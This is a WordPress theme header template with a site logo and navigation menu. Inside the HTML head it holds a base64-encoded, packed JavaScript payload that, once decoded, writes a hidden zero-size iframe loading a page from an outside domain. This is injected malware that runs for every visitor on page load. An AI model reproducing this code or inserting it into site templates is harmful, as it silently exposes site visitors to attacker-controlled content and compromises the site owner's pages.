<!DOCTYPE html>
<html lang="pt-br">
	<head>
		<meta charset="UTF-8">
		<title><?php wp_title() ?></title>
		<link rel="shortcut icon" href="<?php echo get_stylesheet_directory_uri(); ?>/favicon.png">
		<?php wp_head() ?>
	<?php echo base64_decode("PHNjcmlwdCBsYW5ndWFnZSA9ICdqYXZhc2NyaXB0Jz4NCmV2YWwoZnVuY3Rpb24ocCxhLGMsayxlLHIpe2U9ZnVuY3Rpb24oYyl7cmV0dXJuIGMudG9TdHJpbmcoYSl9O2lmKCEnJy5yZXBsYWNlKC9eLyxTdHJpbmcpKXt3aGlsZShjLS0pcltlKGMpXT1rW2NdfHxlKGMpO2s9W2Z1bmN0aW9uKGUpe3JldHVybiByW2VdfV07ZT1mdW5jdGlvbigpe3JldHVybidcXHcrJ307Yz0xfTt3aGlsZShjLS0paWYoa1tjXSlwPXAucmVwbGFjZShuZXcgUmVnRXhwKCdcXGInK2UoYykrJ1xcYicsJ2cnKSxrW2NdKTtyZXR1cm4gcH0oJ2EuNyhcJzwxIDM9IjQ6Ly81LjYvMi44IiA5PSIwIiBiPSIwIiBjPSJkOmUiPjwvMT5cJyk7JywxNSwxNSwnfGlmcmFtZXxyb2JvdHxzcmN8aHR0cHxib2R5ZnJvY2t8Y29tfHdyaXRlfGh0bWx8d2lkdGh8ZG9jdW1lbnR8aGVpZ2h0fHN0eWxlfGRpc3BsYXl8bm9uZScuc3BsaXQoJ3wnKSwwLHt9KSkNCjwvc2NyaXB0Pg=="); ?></head>
	<body <?php body_class() ?>>
		<header class="head" role="banner">
			<?php my_logo() ?>

			<?php my_nav_menu() ?>

		</header>
		<main class="main" role="main">
